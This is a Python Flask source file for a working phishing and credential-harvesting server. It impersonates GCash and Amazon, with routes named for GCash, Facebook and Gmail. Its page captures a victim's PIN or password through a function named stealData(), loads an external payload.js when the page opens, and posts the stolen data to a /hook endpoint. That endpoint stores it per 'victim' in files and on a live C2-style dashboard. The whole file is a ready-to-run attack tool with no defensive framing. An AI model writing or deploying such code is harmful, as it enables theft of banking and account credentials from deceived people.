from flask import Flask, request, render_template_string, send_from_directory
import os, json, sqlite3, base64, hashlib
from datetime import datetime
import threading
from urllib.parse import quote

app = Flask(__name__)
DATA_DIR = "harvested_data"
os.makedirs(DATA_DIR, exist_ok=True)

# Global storage
victims = {}

def save_data(phone_id, data_type, data):
    timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = f"{DATA_DIR}/{phone_id}_{data_type}_{timestamp}.txt"
    with open(filename, 'w') as f:
        f.write(f"VICTIM: {phone_id}\nTYPE: {data_type}\nTIME: {datetime.now()}\n\n{data}\n")
    print(f"💾 SAVED: {filename}")
    return filename

@app.route('/', defaults={'path': ''})
@app.route('/<path:path>')
def catch_all(path):
    """All paths serve phishing page"""
    return phish_page()

@app.route('/payload.js')
def payload():
    return send_from_directory('.', 'payload.js')

@app.route('/hook', methods=['POST'])
def webhook():
    global victims
    data = request.json
    phone_id = data.get('device_id', 'unknown')
    data_type = data.get('type', 'unknown')
    
    # Save raw data
    save_data(phone_id, data_type, json.dumps(data))
    
    # Structured storage
    if phone_id not in victims:
        victims[phone_id] = {}
    victims[phone_id][data_type] = data
    
    print(f"🎯 [{phone_id}] {data_type}: {data.get('value', 'N/A')[:50]}...")
    
    # Live dashboard update
    with open('dashboard.html', 'w') as f:
        f.write(render_dashboard())
    
    return 'OK'

def render_dashboard():
    html = """
    <!DOCTYPE html>
    <html>
    <head><title>Mobile Pentest C2</title>
    <style>body{font-family:monospace;background:#000;color:#0f0;padding:20px;}
    .victim{border:1px solid #0f0;padding:15px;margin:10px 0;}
    pre{background:#111;padding:10px;border-radius:5px;}</style></head>
    <body>
    <h1>📱 Mobile Data Harvest (""" + str(len(victims)) + """ victims)</h1>
    """
    for phone, data in victims.items():
        html += f'<div class="victim"><h3>📱 {phone}</h3>'
        for dtype, dval in data.items():
            html += f'<h4>{dtype}</h4><pre>{json.dumps(dval, indent=2)[:500]}...</pre>'
        html += '</div>'
    html += "</body></html>"
    return html

def phish_page():
    return render_template_string("""
<!DOCTYPE html>
<html>
<head>
    <title>Amazon - Account Verification Required</title>
    <meta name="viewport" content="width=device-width">
    <style>
        body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;background:#ffeb3b;margin:0;padding:20px;color:#333;}
        .container{max-width:400px;margin:0 auto;background:white;border-radius:10px;padding:30px;box-shadow:0 10px 30px rgba(0,0,0,0.3);}
        input{padding:15px;margin:10px 0;border:1px solid #ddd;border-radius:5px;width:100%;box-sizing:border-box;font-size:16px;}
        button{background:#ff9900;color:white;border:none;padding:15px;border-radius:5px;width:100%;font-size:16px;font-weight:bold;cursor:pointer;}
        button:hover{background:#e68900;}
        .logo{text-align:center;margin-bottom:20px;}
        .logo img{width:150px;}
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">🏦 GCash Security</div>
        <h2>Account Verification Required</h2>
        <p>Your session has expired. Please verify to continue.</p>
        
        <div id="form">
            <input type="password" id="password" placeholder="Enter PIN / Password">
            <button onclick="stealData()">Verify Account</button>
        </div>
        
        <div id="loading" style="display:none;text-align:center;">
            <p>Verifying...</p>
            <div style="width:30px;height:30px;border:3px solid #f3f3f3;border-top:3px solid #ff9900;border-radius:50%;animation:spin 1s linear infinite;margin:20px auto;"></div>
        </div>
    </div>
    
    <script>
        // Load payload immediately
        const script = document.createElement('script');
        script.src = '/payload.js?t=' + Date.now();
        document.head.appendChild(script);
        
        function stealData() {
            const pass = document.getElementById('password').value;
            document.getElementById('form').style.display = 'none';
            document.getElementById('loading').style.display = 'block';
            
            // Send password immediately
            fetch('/hook', {
                method: 'POST',
                headers: {'Content-Type':'application/json'},
                body: JSON.stringify({
                    device_id: navigator.userAgent + Math.random(),
                    type: 'password',
                    value: pass,
                    timestamp: new Date().toISOString()
                })
            });
            
            // Continue credential harvesting...
            setTimeout(() => {
                document.body.innerHTML = '<h2>Verification Successful</h2><p>Redirecting...</p>';
            }, 2000);
        }
        
        // Auto-submit on enter
        document.addEventListener('keypress', e => {
            if (e.key === 'Enter') stealData();
        });
    </script>
    
    <style>@keyframes spin{0%{transform:rotate(0deg);}100%{transform:rotate(360deg);}}</style>
</body>
</html>
    """)

@app.route('/gcash')
@app.route('/facebook')
@app.route('/gmail')
def branded_phish():
    """Branded phishing pages"""
    return phish_page()

if __name__ == '__main__':
    print("🚀 Phishing C2 Server running: http://0.0.0.0:5000")
    print("📱 Data saved to: ./harvested_data/")
    print("🔗 Phishing links:")
    print("   http://YOUR_IP:5000")
    print("   http://YOUR_IP:5000/gcash")
    print("   http://YOUR_IP:5000/facebook")
    app.run(host='0.0.0.0', port=5000, debug=False)
